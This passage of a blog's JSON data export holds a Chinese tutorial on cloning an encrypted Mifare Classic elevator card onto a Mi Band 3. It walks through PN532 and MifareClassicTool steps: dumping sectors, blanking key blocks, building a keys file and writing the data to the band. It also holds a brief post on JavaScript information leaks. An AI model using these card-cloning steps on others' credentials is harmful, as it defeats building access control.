title=\"四、总结\"></a>四、总结</h3><p>国内一直关于勒索层出不穷,多数出现企业和医院类受影响的可能性较大;想要确保系统安全运行,养成好的安全管理(三分技术,七分管理)很大程度应对勒索.祝好运…</p>\n"},{"title":"前端安全漏洞学习","date":"2020-03-26T01:15:40.000Z","_content":"JavaScript作为前端功能强大的客户端脚本语言，本质是一种解释型语言。所以，其执行原理是边解释边运行。上述特性就决定了JavaScript与一些服务器脚本语言（如ASP、PHP）以及编译型语言（如C、C++）不同，其源代码可以轻松被任何人获取到。而粗心的开发者将各式敏感信息存储在JavaScript脚本中，由于JS的特性，攻击者可以对这些信息一览无余，从而导致对WEB服务和用户隐私造成不同程度的威胁。\n\n## 前言\n\nJavaScript作为前端功能强大的客户端脚本语言,但存在一些安全隐患,而这些隐患也同样存在漏洞挖掘过程中.(学习吧！！！)\n\n![](/images/javascript_security/login_JS.png)\n\n<center>JS内信息泄漏</center>\n\n### 前端安全(JavaScript)\n\n后期漏洞学习及汇总会直接更新到Github中,学习,使你我变得更好.\n\n[[前端安全漏洞](https://github.com/si1ent-le/JavaScript_Security/blob/master/前端安全漏洞.md)]","source":"_posts/前端安全漏洞学习.md","raw":"---\ntitle: 前端安全漏洞学习\ndate: 2020-03-26 09:15:40\ntags:\n - 前端安全\n---\nJavaScript作为前端功能强大的客户端脚本语言，本质是一种解释型语言。所以，其执行原理是边解释边运行。上述特性就决定了JavaScript与一些服务器脚本语言（如ASP、PHP）以及编译型语言（如C、C++）不同，其源代码可以轻松被任何人获取到。而粗心的开发者将各式敏感信息存储在JavaScript脚本中，由于JS的特性，攻击者可以对这些信息一览无余，从而导致对WEB服务和用户隐私造成不同程度的威胁。\n\n## 前言\n\nJavaScript作为前端功能强大的客户端脚本语言,但存在一些安全隐患,而这些隐患也同样存在漏洞挖掘过程中.(学习吧！！！)\n\n![](/images/javascript_security/login_JS.png)\n\n<center>JS内信息泄漏</center>\n\n### 前端安全(JavaScript)\n\n后期漏洞学习及汇总会直接更新到Github中,学习,使你我变得更好.\n\n[[前端安全漏洞](https://github.com/si1ent-le/JavaScript_Security/blob/master/前端安全漏洞.md)]","slug":"前端安全漏洞学习","published":1,"updated":"2020-10-23T03:29:29.486Z","_id":"ckglobhe0000sb1hq478s3c6n","comments":1,"layout":"post","photos":[],"link":"","content":"<p>JavaScript作为前端功能强大的客户端脚本语言，本质是一种解释型语言。所以，其执行原理是边解释边运行。上述特性就决定了JavaScript与一些服务器脚本语言（如ASP、PHP）以及编译型语言（如C、C++）不同，其源代码可以轻松被任何人获取到。而粗心的开发者将各式敏感信息存储在JavaScript脚本中，由于JS的特性，攻击者可以对这些信息一览无余，从而导致对WEB服务和用户隐私造成不同程度的威胁。</p>\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>JavaScript作为前端功能强大的客户端脚本语言,但存在一些安全隐患,而这些隐患也同样存在漏洞挖掘过程中.(学习吧！！！)</p>\n<p><img src=\"/images/javascript_security/login_JS.png\"></p>\n<center>JS内信息泄漏</center>\n\n<h3 id=\"前端安全-JavaScript\"><a href=\"#前端安全-JavaScript\" class=\"headerlink\" title=\"前端安全(JavaScript)\"></a>前端安全(JavaScript)</h3><p>后期漏洞学习及汇总会直接更新到Github中,学习,使你我变得更好.</p>\n<p>[<a href=\"https://github.com/si1ent-le/JavaScript_Security/blob/master/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E.md\">前端安全漏洞</a>]</p>\n","site":{"data":{}},"excerpt":"","more":"<p>JavaScript作为前端功能强大的客户端脚本语言，本质是一种解释型语言。所以，其执行原理是边解释边运行。上述特性就决定了JavaScript与一些服务器脚本语言（如ASP、PHP）以及编译型语言（如C、C++）不同，其源代码可以轻松被任何人获取到。而粗心的开发者将各式敏感信息存储在JavaScript脚本中，由于JS的特性，攻击者可以对这些信息一览无余，从而导致对WEB服务和用户隐私造成不同程度的威胁。</p>\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>JavaScript作为前端功能强大的客户端脚本语言,但存在一些安全隐患,而这些隐患也同样存在漏洞挖掘过程中.(学习吧！！！)</p>\n<p><img src=\"/images/javascript_security/login_JS.png\"></p>\n<center>JS内信息泄漏</center>\n\n<h3 id=\"前端安全-JavaScript\"><a href=\"#前端安全-JavaScript\" class=\"headerlink\" title=\"前端安全(JavaScript)\"></a>前端安全(JavaScript)</h3><p>后期漏洞学习及汇总会直接更新到Github中,学习,使你我变得更好.</p>\n<p>[<a href=\"https://github.com/si1ent-le/JavaScript_Security/blob/master/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E.md\">前端安全漏洞</a>]</p>\n"},{"title":"加密电梯卡成功复制至米3手环","date":"2019-07-11T04:41:37.000Z","_content":"平时工作、生活中难免会遇到电梯卡、门禁卡等类似RFID卡，但也同样遭遇忘带、丢失等情况；而这次将为您解决这些烦心事.\n\n![](/images/nfc/card.jpg)\n\n<center>哇!好像很强哦!</center>\n\n## 写在前面\n\n小米官方介绍小米手环不支持模拟/复制加密类智能卡.\n\n![](/images/nfc/1.jpg)\n\n如果你不相信那你可以看看下面识别后出现的结果,如下图所示:\n\n![](/images/nfc/2.jpg)\n\n## Tools\n\n1、MifareClassicTool-2.3.1([附上下载链接](http://www.si1ent.xyz/Tools/MifareClassicTool-2.3.1.apk))\n\n2、PN532([附带上机位软件一套](http://www.si1ent.xyz/Tools/PN532_Tools.zip)某宝上搜搜就行)\n\n3、M1 UID白卡一张(随意修改数据,无限修改)\n\n4、加密电梯卡一张\n\n5、手环(米3手环一个)\n\n6、支持NFC功能手机一部\n\n7、附属工具：小米账户+安装好小米运动绑定手环\n\n(备注:加密识别后0扇区内的第一块数据前8位是UID号,后面是厂家信息,想了解更多关于RFID、NFC知识可自行网上找找资料😄)\n\n## 步骤\n\n0、在以上工具准备齐全后开始我们今天的学习吧;\n\n1、支持NFC手机安装MifareClassicTool-2.3.1好软件及准备工作完成;(这部分不进行截图,这里软件是Android类,直接安装即可.)\n\n2、电脑USB连接PN532.驱动程序在压缩包内,安装可参考压缩包内文件.\n\n![](/images/nfc/3.jpg)\n\n<center>图示：PN532运行截图(检测驱动是否安装完成)</center>\n\n3、PN532读取电梯卡内数据(如果电梯卡属于加密类UID卡,那么在每个扇区中第4块内存放密钥,如果属于空卡那么在第4块中的数据应该是: FFFFFFFFFFFFFF078069FFFFFFFFFFFF) 如下图所示.\n\n![](/images/nfc/4.jpg)\n\n<center>图示：空UID卡,电梯卡同样方式读取数据</center>\n\n4、点击左上角三角形保存dump文件,使用notepad++打开并把所有第4扇区内数据修改为FFFFFFFFFFFFFF078069FFFFFFFFFFFF这些.\n\n![](/images/nfc/5.jpg stye=\"50%\")\n\n<center>图示:空UID数据备份,电梯卡同样识别保存</center>\n\n![](/images/nfc/6.jpg)\n\n<center>图示:电梯加密卡每扇区第4块数据显示为密钥</center>\n\n![](/images/nfc/7.jpg)\n\n<center>图示:修改为空的UID卡对比加密卡数据(主要修改每扇区第4块数据为空即可)</center>\n\n5、选择写入UID卡,提示选择待写入的dump文件,这里选择我们把电梯卡内扇区修改为空密码的dump文件,进行写入即可(建议重新读取空白UID内的数据并重新识别UID号是否已经被修改成电梯卡的UID号).\n\n![](/images/nfc/8.jpg)\n\n<center>图示:选择写UID卡</center>\n\n![](/images/nfc/9.jpg)\n\n<center>图示:选择空白电梯卡数据dump文件(关于选择dump文件后面会说明原因)</center>\n\n6、手环模拟空白的UID卡,此时提示已经提示模拟成功;\n\n备注:可以使用软件识别手环的UID是否是电梯卡的UID数据;(这里当时忘记截图了)\n\n7、之前NFC手机安装MifareClassicTool-2.3.1后并不能直接读取电梯卡内数据(只能读取0扇区数据,其他扇区无法读取如下图所示:)\n\n![](/images/nfc/10.jpg)\n\n<center>图示:NFC识别加密电梯卡数据</center>\n\n8、如上图,我们无法获取其他加密扇区数据,so,这才用之前dump出的电梯卡数据(复制dump文件内的16进制的每行前12字符),再在工具MifareClassicTool-2.3.1新建一个keys文件,粘贴加密的dump内的12个字符,点击保存已经生成一个新的keys文件.\n\n推荐工具:[在线去除指定字符数工具](http://www.txttool.com/WenBen_R-.asp)\n\n![](/images/nfc/11.jpg)\n\n<center>图示:点击工具内\"编辑/增加加密钥文件\",右上角创建新文件</center>\n\n![](/images/nfc/12.jpg)\n\n<center>图示:文件名无所谓</center>\n\n![](/images/nfc/13.jpg)\n\n<center>图示:粘贴加密数据,每行前12字符</center>\n\n![](/images/nfc/14.jpg)\n\n<center>图示:回到主页面再点击\"读标签\"</center>\n\n![](/images/nfc/15.jpg)\n\n选择keys文件后记得把加密的电梯卡贴到NFC手机,这样就会把所有数据识别到(包括之前1到15扇区无法读取的数据,因为我们之前选择了自己新建的keys文件)\n\n![](/images/nfc/16.jpg)\n\n<center>图示:默认选择所有扇区，然后撤下电梯卡换上手环尝试写入数据.</center>\n\n9、更换手环后不要随意移动手环,提示写入成功,那么手环基本复制完加密电梯卡了.\n\n## 总结\n\n由于电梯卡不是属于本人的,所以部分截图无法一一贴入,帮客户复制到手环的,但是听客户电话说手环成功刷电梯了,内心还是高兴的,毕竟也是大概搞了一周的时间才完成.哎呀,这效率惊人丫！！！\n\n1、为什么要把电梯卡内密钥块删除并拷贝到空UID内?\n\n​\t其一:想尝试复制一张非加密的空UID卡,这样电梯卡和空的UID的UID号一致，测试是否可以刷电梯;\n\n​\t其二:而且手环本身也要先模拟一张空的UID卡,因此干脆用这个了.\n\n​\t结果:空的UID卡不能刷电梯的,尴尬😅\n\n2、原本用PM3去一键解析加密的电梯卡,可惜浪费了很久啊,而且还没解密成功;所以,建议大家直接买个PN532就行了.\n\n3、PN532识别到电梯加密数据、空白UID卡后建议各备份一份dump文件,后期恢复使用.\n\n4、MCT工具新建时粘贴的16进制数据是电梯卡内16个扇区内每块前12字符数据,(如果复制的数据量或长度不对软件会提示报错)\n\n5、MCT新建后记得点击新建keys文件后重新读取电梯卡,并发现除0扇区后其他扇区的所有数据是否补全.\n\n6、补全后点击右上角的\"写转储\",这时提示所有扇区信息,然后尝试写入即可.\n\n7、写入完后,可以再使用软件读取手环内数据,如果软件识别后1-15扇区的数据显示无法获取key值,那么可以确定手环复制成功.\n\n8、关于智能卡的介绍及知识本人也在学习中,如果想学习了解更多可看下\"参考\"内的链接.\n\n## 参考\n\n[视屏教程参考](https://www.bilibili.com/video/av33911423/?spm_id_from=333.788.videocard.0ß)\n\n[PM3及相关类型卡介绍](https://www.docin.com/p-2096377705.html)\n\n## 其他方式及流程\n\n0、以上工具除去PN532不用其他均需要\n\n1、删除小米运动手环模拟信息,重新模拟门禁卡;\n\n2、开始检测门禁卡,贴上空白UID卡,提示检测成功;\n\n3、点击开始模拟前,换上我们的电梯卡过去,应该提示模拟成功,输入名称即可.\n\n这个方法本人测试了,但是没有去尝试电梯刷手环测试;所以结果如何还是未知；但是个人觉得不靠谱,因为我们开始模拟的就是非加密类卡,即使后面再模拟,那手环内的数据应该还是空的UID卡内的数据.","source":"_posts/加密电梯卡成功复制至米3手环.md","raw":"---\ntitle: 加密电梯卡成功复制至米3手环\ndate: 2019-07-11 12:41:37\ntags:\n - 智能卡\n---\n平时工作、生活中难免会遇到电梯卡、门禁卡等类似RFID卡，但也同样遭遇忘带、丢失等情况；而这次将为您解决这些烦心事.\n\n![](/images/nfc/card.jpg)\n\n<center>哇!好像很强哦!</center>\n\n## 写在前面\n\n小米官方介绍小米手环不支持模拟/复制加密类智能卡.\n\n![](/images/nfc/1.jpg)\n\n如果你不相信那你可以看看下面识别后出现的结果,如下图所示:\n\n![](/images/nfc/2.jpg)\n\n## Tools\n\n1、MifareClassicTool-2.3.1([附上下载链接](http://www.si1ent.xyz/Tools/MifareClassicTool-2.3.1.apk))\n\n2、PN532([附带上机位软件一套](http://www.si1ent.xyz/Tools/PN532_Tools.zip)某宝上搜搜就行)\n\n3、M1 UID白卡一张(随意修改数据,无限修改)\n\n4、加密电梯卡一张\n\n5、手环(米3手环一个)\n\n6、支持NFC功能手机一部\n\n7、附属工具：小米账户+安装好小米运动绑定手环\n\n(备注:加密识别后0扇区内的第一块数据前8位是UID号,后面是厂家信息,想了解更多关于RFID、NFC知识可自行网上找找资料😄)\n\n## 步骤\n\n0、在以上工具准备齐全后开始我们今天的学习吧;\n\n1、支持NFC手机安装MifareClassicTool-2.3.1好软件及准备工作完成;(这部分不进行截图,这里软件是Android类,直接安装即可.)\n\n2、电脑USB连接PN532.驱动程序在压缩包内,安装可参考压缩包内文件.\n\n![](/images/nfc/3.jpg)\n\n<center>图示：PN532运行截图(检测驱动是否安装完成)</center>\n\n3、PN532读取电梯卡内数据(如果电梯卡属于加密类UID卡,那么在每个扇区中第4块内存放密钥,如果属于空卡那么在第4块中的数据应该是: FFFFFFFFFFFFFF078069FFFFFFFFFFFF) 如下图所示.\n\n![](/images/nfc/4.jpg)\n\n<center>图示：空UID卡,电梯卡同样方式读取数据</center>\n\n4、点击左上角三角形保存dump文件,使用notepad++打开并把所有第4扇区内数据修改为FFFFFFFFFFFFFF078069FFFFFFFFFFFF这些.\n\n![](/images/nfc/5.jpg stye=\"50%\")\n\n<center>图示:空UID数据备份,电梯卡同样识别保存</center>\n\n![](/images/nfc/6.jpg)\n\n<center>图示:电梯加密卡每扇区第4块数据显示为密钥</center>\n\n![](/images/nfc/7.jpg)\n\n<center>图示:修改为空的UID卡对比加密卡数据(主要修改每扇区第4块数据为空即可)</center>\n\n5、选择写入UID卡,提示选择待写入的dump文件,这里选择我们把电梯卡内扇区修改为空密码的dump文件,进行写入即可(建议重新读取空白UID内的数据并重新识别UID号是否已经被修改成电梯卡的UID号).\n\n![](/images/nfc/8.jpg)\n\n<center>图示:选择写UID卡</center>\n\n![](/images/nfc/9.jpg)\n\n<center>图示:选择空白电梯卡数据dump文件(关于选择dump文件后面会说明原因)</center>\n\n6、手环模拟空白的UID卡,此时提示已经提示模拟成功;\n\n备注:可以使用软件识别手环的UID是否是电梯卡的UID数据;(这里当时忘记截图了)\n\n7、之前NFC手机安装MifareClassicTool-2.3.1后并不能直接读取电梯卡内数据(只能读取0扇区数据,其他扇区无法读取如下图所示:)\n\n![](/images/nfc/10.jpg)\n\n<center>图示:NFC识别加密电梯卡数据</center>\n\n8、如上图,我们无法获取其他加密扇区数据,so,这才用之前dump出的电梯卡数据(复制dump文件内的16进制的每行前12字符),再在工具MifareClassicTool-2.3.1新建一个keys文件,粘贴加密的dump内的12个字符,点击保存已经生成一个新的keys文件.\n\n推荐工具:[在线去除指定字符数工具](http://www.txttool.com/WenBen_R-.asp)\n\n![](/images/nfc/11.jpg)\n\n<center>图示:点击工具内\"编辑/增加加密钥文件\",右上角创建新文件</center>\n\n![](/images/nfc/12.jpg)\n\n<center>图示:文件名无所谓</center>\n\n![](/images/nfc/13.jpg)\n\n<center>图示:粘贴加密数据,每行前12字符</center>\n\n![](/images/nfc/14.jpg)\n\n<center>图示:回到主页面再点击\"读标签\"</center>\n\n![](/images/nfc/15.jpg)\n\n选择keys文件后记得把加密的电梯卡贴到NFC手机,这样就会把所有数据识别到(包括之前1到15扇区无法读取的数据,因为我们之前选择了自己新建的keys文件)\n\n![](/images/nfc/16.jpg)\n\n<center>图示:默认选择所有扇区，然后撤下电梯卡换上手环尝试写入数据.</center>\n\n9、更换手环后不要随意移动手环,提示写入成功,那么手环基本复制完加密电梯卡了.\n\n## 总结\n\n由于电梯卡不是属于本人的,所以部分截图无法一一贴入,帮客户复制到手环的,但是听客户电话说手环成功刷电梯了,内心还是高兴的,毕竟也是大概搞了一周的时间才完成.哎呀,这效率惊人丫！！！\n\n1、为什么要把电梯卡内密钥块删除并拷贝到空UID内?\n\n​\t其一:想尝试复制一张非加密的空UID卡,这样电梯卡和空的UID的UID号一致，测试是否可以刷电梯;\n\n​\t其二:而且手环本身也要先模拟一张空的UID卡,因此干脆用这个了.\n\n​\t结果:空的UID卡不能刷电梯的,尴尬😅\n\n2、原本用PM3去一键解析加密的电梯卡,可惜浪费了很久啊,而且还没解密成功;所以,建议大家直接买个PN532就行了.\n\n3、PN532识别到电梯加密数据、空白UID卡后建议各备份一份dump文件,后期恢复使用.\n\n4、MCT工具新建时粘贴的16进制数据是电梯卡内16个扇区内每块前12字符数据,(如果复制的数据量或长度不对软件会提示报错)\n\n5、MCT新建后记得点击新建keys文件后重新读取电梯卡,并发现除0扇区后其他扇区的所有数据是否补全.\n\n6、补全后点击右上角的\"写转储\",这时提示所有扇区信息,然后尝试写入即可.\n\n7、写入完后,可以再使用软件读取手环内数据,如果软件识别后1-15扇区的数据显示无法获取key值,那么可以确定手环复制成功.\n\n8、关于智能卡的介绍及知识本人也在学习中,如果想学习了解更多可看下\"参考\"内的链接.\n\n## 参考\n\n[视屏教程参考](https://www.bilibili.com/video/av33911423/?spm_id_from=333.788.videocard.0ß)\n\n[PM3及相关类型卡介绍](https://www.docin.com/p-2096377705.html)\n\n## 其他方式及流程\n\n0、以上工具除去PN532不用其他均需要\n\n1、删除小米运动手环模拟信息,重新模拟门禁卡;\n\n2、开始检测门禁卡,贴上空白UID卡,提示检测成功;\n\n3、点击开始模拟前,换上我们的电梯卡过去,应该提示模拟成功,输入名称即可.\n\n这个方法本人测试了,但是没有去尝试电梯刷手环测试;所以结果如何还是未知；但是个人觉得不靠谱,因为我们开始模拟的就是非加密类卡,即使后面再模拟,那手环内的数据应该还是空的UID卡内的数据.","slug":"加密电梯卡成功复制至米3手环","published":1,"updated":"2020-10-23T03:28:59.381Z","_id":"ckglobhe1000tb1hqfby9b5b4","comments":1,"layout":"post","photos":[],"link":"","content":"<p>平时工作、生活中难免会遇到电梯卡、门禁卡等类似RFID卡，但也同样遭遇忘带、丢失等情况；而这次将为您解决这些烦心事.</p>\n<p><img src=\"/images/nfc/card.jpg\"></p>\n<center>哇!好像很强哦!</center>\n\n<h2 id=\"写在前面\"><a href=\"#写在前面\" class=\"headerlink\" title=\"写在前面\"></a>写在前面</h2><p>小米官方介绍小米手环不支持模拟/复制加密类智能卡.</p>\n<p><img src=\"/images/nfc/1.jpg\"></p>\n<p>如果你不相信那你可以看看下面识别后出现的结果,如下图所示:</p>\n<p><img src=\"/images/nfc/2.jpg\"></p>\n<h2 id=\"Tools\"><a href=\"#Tools\" class=\"headerlink\" title=\"Tools\"></a>Tools</h2><p>1、MifareClassicTool-2.3.1(<a href=\"http://www.si1ent.xyz/Tools/MifareClassicTool-2.3.1.apk\">附上下载链接</a>)</p>\n<p>2、PN532(<a href=\"http://www.si1ent.xyz/Tools/PN532_Tools.zip\">附带上机位软件一套</a>某宝上搜搜就行)</p>\n<p>3、M1 UID白卡一张(随意修改数据,无限修改)</p>\n<p>4、加密电梯卡一张</p>\n<p>5、手环(米3手环一个)</p>\n<p>6、支持NFC功能手机一部</p>\n<p>7、附属工具：小米账户+安装好小米运动绑定手环</p>\n<p>(备注:加密识别后0扇区内的第一块数据前8位是UID号,后面是厂家信息,想了解更多关于RFID、NFC知识可自行网上找找资料😄)</p>\n<h2 id=\"步骤\"><a href=\"#步骤\" class=\"headerlink\" title=\"步骤\"></a>步骤</h2><p>0、在以上工具准备齐全后开始我们今天的学习吧;</p>\n<p>1、支持NFC手机安装MifareClassicTool-2.3.1好软件及准备工作完成;(这部分不进行截图,这里软件是Android类,直接安装即可.)</p>\n<p>2、电脑USB连接PN532.驱动程序在压缩包内,安装可参考压缩包内文件.</p>\n<p><img src=\"/images/nfc/3.jpg\"></p>\n<center>图示：PN532运行截图(检测驱动是否安装完成)</center>\n\n<p>3、PN532读取电梯卡内数据(如果电梯卡属于加密类UID卡,那么在每个扇区中第4块内存放密钥,如果属于空卡那么在第4块中的数据应该是: FFFFFFFFFFFFFF078069FFFFFFFFFFFF) 如下图所示.</p>\n<p><img src=\"/images/nfc/4.jpg\"></p>\n<center>图示：空UID卡,电梯卡同样方式读取数据</center>\n\n<p>4、点击左上角三角形保存dump文件,使用notepad++打开并把所有第4扇区内数据修改为FFFFFFFFFFFFFF078069FFFFFFFFFFFF这些.</p>\n<p>![](/images/nfc/5.jpg stye=”50%”)</p>\n<center>图示:空UID数据备份,电梯卡同样识别保存</center>\n\n<p><img src=\"/images/nfc/6.jpg\"></p>\n<center>图示:电梯加密卡每扇区第4块数据显示为密钥</center>\n\n<p><img src=\"/images/nfc/7.jpg\"></p>\n<center>图示:修改为空的UID卡对比加密卡数据(主要修改每扇区第4块数据为空即可)</center>\n\n<p>5、选择写入UID卡,提示选择待写入的dump文件,这里选择我们把电梯卡内扇区修改为空密码的dump文件,进行写入即可(建议重新读取空白UID内的数据并重新识别UID号是否已经被修改成电梯卡的UID号).</p>\n<p><img src=\"/images/nfc/8.jpg\"></p>\n<center>图示:选择写UID卡</center>\n\n<p><img src=\"/images/nfc/9.jpg\"></p>\n<center>图示:选择空白电梯卡数据dump文件(关于选择dump文件后面会说明原因)</center>\n\n<p>6、手环模拟空白的UID卡,此时提示已经提示模拟成功;</p>\n<p>备注:可以使用软件识别手环的UID是否是电梯卡的UID数据;(这里当时忘记截图了)</p>\n<p>7、之前NFC手机安装MifareClassicTool-2.3.1后并不能直接读取电梯卡内数据(只能读取0扇区数据,其他扇区无法读取如下图所示:)</p>\n<p><img src=\"/images/nfc/10.jpg\"></p>\n<center>图示:NFC识别加密电梯卡数据</center>\n\n<p>8、如上图,我们无法获取其他加密扇区数据,so,这才用之前dump出的电梯卡数据(复制dump文件内的16进制的每行前12字符),再在工具MifareClassicTool-2.3.1新建一个keys文件,粘贴加密的dump内的12个字符,点击保存已经生成一个新的keys文件.</p>\n<p>推荐工具:<a href=\"http://www.txttool.com/WenBen_R-.asp\">在线去除指定字符数工具</a></p>\n<p><img src=\"/images/nfc/11.jpg\"></p>\n<center>图示:点击工具内\"编辑/增加加密钥文件\",右上角创建新文件</center>\n\n<p><img src=\"/images/nfc/12.jpg\"></p>\n<center>图示:文件名无所谓</center>\n\n<p><img src=\"/images/nfc/13.jpg\"></p>\n<center>图示:粘贴加密数据,每行前12字符</center>\n\n<p><img src=\"/images/nfc/14.jpg\"></p>\n<center>图示:回到主页面再点击\"读标签\"</center>\n\n<p><img src=\"/images/nfc/15.jpg\"></p>\n<p>选择keys文件后记得把加密的电梯卡贴到NFC手机,这样就会把所有数据识别到(包括之前1到15扇区无法读取的数据,因为我们之前选择了自己新建的keys文件)</p>\n<p><img src=\"/images/nfc/16.jpg\"></p>\n<center>图示:默认选择所有扇区，然后撤下电梯卡换上手环尝试写入数据.</center>\n\n<p>9、更换手环后不要随意移动手环,提示写入成功,那么手环基本复制完加密电梯卡了.</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>由于电梯卡不是属于本人的,所以部分截图无法一一贴入,帮客户复制到手环的,但是听客户电话说手环成功刷电梯了,内心还是高兴的,毕竟也是大概搞了一周的时间才完成.哎呀,这效率惊人丫！！！</p>\n<p>1、为什么要把电梯卡内密钥块删除并拷贝到空UID内?</p>\n<p>​    其一:想尝试复制一张非加密的空UID卡,这样电梯卡和空的UID的UID号一致，测试是否可以刷电梯;</p>\n<p>​    其二:而且手环本身也要先模拟一张空的UID卡,因此干脆用这个了.</p>\n<p>​    结果:空的UID卡不能刷电梯的,尴尬😅</p>\n<p>2、原本用PM3去一键解析加密的电梯卡,可惜浪费了很久啊,而且还没解密成功;所以,建议大家直接买个PN532就行了.</p>\n<p>3、PN532识别到电梯加密数据、空白UID卡后建议各备份一份dump文件,后期恢复使用.</p>\n<p>4、MCT工具新建时粘贴的16进制数据是电梯卡内16个扇区内每块前12字符数据,(如果复制的数据量或长度不对软件会提示报错)</p>\n<p>5、MCT新建后记得点击新建keys文件后重新读取电梯卡,并发现除0扇区后其他扇区的所有数据是否补全.</p>\n<p>6、补全后点击右上角的”写转储”,这时提示所有扇区信息,然后尝试写入即可.</p>\n<p>7、写入完后,可以再使用软件读取手环内数据,如果软件识别后1-15扇区的数据显示无法获取key值,那么可以确定手环复制成功.</p>\n<p>8、关于智能卡的介绍及知识本人也在学习中,如果想学习了解更多可看下”参考”内的链接.</p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><p><a href=\"https://www.bilibili.com/video/av33911423/?spm_id_from=333.788.videocard.0%C3%9F\">视屏教程参考</a></p>\n<p><a href=\"https://www.docin.com/p-2096377705.html\">PM3及相关类型卡介绍</a></p>\n<h2 id=\"其他方式及流程\"><a href=\"#其他方式及流程\" class=\"headerlink\" title=\"其他方式及流程\"></a>其他方式及流程</h2><p>0、以上工具除去PN532不用其他均需要</p>\n<p>1、删除小米运动手环模拟信息,重新模拟门禁卡;</p>\n<p>2、开始检测门禁卡,贴上空白UID卡,提示检测成功;</p>\n<p>3、点击开始模拟前,换上我们的电梯卡过去,应该提示模拟成功,输入名称即可.</p>\n<p>这个方法本人测试了,但是没有去尝试电梯刷手环测试;所以结果如何还是未知；但是个人觉得不靠谱,因为我们开始模拟的就是非加密类卡,即使后面再模拟,那手环内的数据应该还是空的UID卡内的数据.</p>\n","site":{"data":{}},"excerpt":"","more":"<p>平时工作、生活中难免会遇到电梯卡、门禁卡等类似RFID卡，但也同样遭遇忘带、丢失等情况；而这次将为您解决这些烦心事.</p>\n<p><img src=\"/images/nfc/card.jpg\"></p>\n<center>哇!好像很强哦!</center>\n\n<h2 id=\"写在前面\"><a href=\"#写在前面\" class=\"headerlink\" title=\"写在前面\"></a>写在前面</h2><p>小米官方介绍小米手环不支持模拟/复制加密类智能卡.</p>\n<p><img src=\"/images/nfc/1.jpg\"></p>\n<p>如果你不相信那你可以看看下面识别后出现的结果,如下图所示:</p>\n<p><img src=\"/images/nfc/2.jpg\"></p>\n<h2 id=\"Tools\"><a href=\"#Tools\" class=\"headerlink\" title=\"Tools\"></a>Tools</h2><p>1、MifareClassicTool-2.3.1(<a href=\"http://www.si1ent.xyz/Tools/MifareClassicTool-2.3.1.apk\">附上下载链接</a>)</p>\n<p>2、PN532(<a href=\"http://www.si1ent.xyz/Tools/PN532_Tools.zip\">附带上机位软件一套</a>某宝上搜搜就行)</p>\n<p>3、M1 UID白卡一张(随意修改数据,无限修改)</p>\n<p>4、加密电梯卡一张</p>\n<p>5、手环(米3手环一个)</p>\n<p>6、支持NFC功能手机一部</p>\n<p>7、附属工具：小米账户+安装好小米运动绑定手环</p>\n<p>(备注:加密识别后0扇区内的第一块数据前8位是UID号,后面是厂家信息,想了解更多关于RFID、NFC知识可自行网上找找资料😄)</p>\n<h2 id=\"步骤\"><a href=\"#步骤\" class=\"headerlink\" title=\"步骤\"></a>步骤</h2><p>0、在以上工具准备齐全后开始我们今天的学习吧;</p>\n<p>1、支持NFC手机安装MifareClassicTool-2.3.1好软件及准备工作完成;(这部分不进行截图,这里软件是Android类,直接安装即可.)</p>\n<p>2、电脑USB连接PN532.驱动程序在压缩包内,安装可参考压缩包内文件.</p>\n<p><img src=\"/images/nfc/3.jpg\"></p>\n<center>图示：PN532运行截图(检测驱动是否安装完成)</center>\n\n<p>3、PN532读取电梯卡内数据(如果电梯卡属于加密类UID卡,那么在每个扇区中第4块内存放密钥,如果属于空卡那么在第4块中的数据应该是: FFFFFFFFFFFFFF078069FFFFFFFFFFFF) 如下图所示.</p>\n<p><img src=\"/images/nfc/4.jpg\"></p>\n<center>图示：空UID卡,电梯卡同样方式读取数据</center>\n\n<p>4、点击左上角三角形保存dump文件,使用notepad++打开并把所有第4扇区内数据修改为FFFFFFFFFFFFFF078069FFFFFFFFFFFF这些.</p>\n<p>![](/images/nfc/5.jpg stye=”50%”)</p>\n<center>图示:空UID数据备份,电梯卡同样识别保存</center>\n\n<p><img src=\"/images/nfc/6.jpg\"></p>\n<center>图示:电梯加密卡每扇区第4块数据显示为密钥</center>\n\n<p><img src=\"/images/nfc/7.jpg\"></p>\n<center>图示:修改为空的UID卡对比加密卡数据(主要修改每扇区第4块数据为空即可)</center>\n\n<p>5、选择写入UID卡,提示选择待写入的dump文件,这里选择我们把电梯卡内扇区修改为空密码的dump文件,进行写入即可(建议重新读取空白UID内的数据并重新识别UID号是否已经被修改成电梯卡的UID号).</p>\n<p><img src=\"/images/nfc/8.jpg\"></p>\n<center>图示:选择写UID卡</center>\n\n<p><img src=\"/images/nfc/9.jpg\"></p>\n<center>图示:选择空白电梯卡数据dump文件(关于选择dump文件后面会说明原因)</center>\n\n<p>6、手环模拟空白的UID卡,此时提示已经提示模拟成功;</p>\n<p>备注:可以使用软件识别手环的UID是否是电梯卡的UID数据;(这里当时忘记截图了)</p>\n<p>7、之前NFC手机安装MifareClassicTool-2.3.1后并不能直接读取电梯卡内数据(只能读取0扇区数据,其他扇区无法读取如下图所示:)</p>\n<p><img src=\"/images/nfc/10.jpg\"></p>\n<center>图示:NFC识别加密电梯卡数据</center>\n\n<p>8、如上图,我们无法获取其他加密扇区数据,so,这才用之前dump出的电梯卡数据(复制dump文件内的16进制的每行前12字符),再在工具MifareClassicTool-2.3.1新建一个keys文件,粘贴加密的dump内的12个字符,点击保存已经生成一个新的keys文件.</p>\n<p>推荐工具:<a href=\"http://www.txttool.com/WenBen_R-.asp\">在线去除指定字符数工具</a></p>\n<p><img src=\"/images/nfc/11.jpg\"></p>\n<center>图示:点击工具内\"编辑/增加加密钥文件\",右上角创建新文件</center>\n\n<p><img src=\"/images/nfc/12.jpg\"></p>\n<center>图示:文件名无所谓</center>\n\n<p><img src=\"/images/nfc/13.jpg\"></p>\n<center>图示:粘贴加密数据,每行前12字符</center>\n\n<p><img src=\"/images/nfc/14.jpg\"></p>\n<center>图示:回到主页面再点击\"读标签\"</center>\n\n<p><img 